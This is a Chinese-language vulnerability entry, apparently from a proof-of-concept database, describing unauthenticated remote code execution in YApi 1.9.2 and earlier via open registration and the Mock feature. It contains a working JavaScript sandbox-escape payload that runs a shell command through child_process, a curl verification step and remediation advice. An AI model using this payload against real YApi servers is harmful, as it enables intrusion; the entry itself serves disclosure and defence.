---
id: YAPI-UNACC
title: YApi 开放注册导致RCE
product: yapi
vendor: YApi
version_affected: "<= 1.9.2"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["YApi"]
---

## 漏洞描述

YApi 是一个 API 管理工具。如果注册功能开放，攻击者可以使用 Mock 功能执行任意代码。

## 影响版本

- YApi <= 1.9.2

## 前置条件

- 无需认证
- 需要注册功能开放

## 利用步骤

1. 注册用户并创建项目
2. 在 Mock 页面填写恶意代码
3. 访问 Mock URL 触发命令执行

## Payload

```javascript
// 在 Mock 页面填写
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("id").toString()
```

## 验证方法

```bash
# 访问 Mock URL 检查命令执行结果
curl -s http://target:3000/mock/project_id/interface_path
```

## 修复建议

1. 升级 YApi 至最新版本
2. 禁用开放注册
3. 对 Mock 脚本进行严格校验
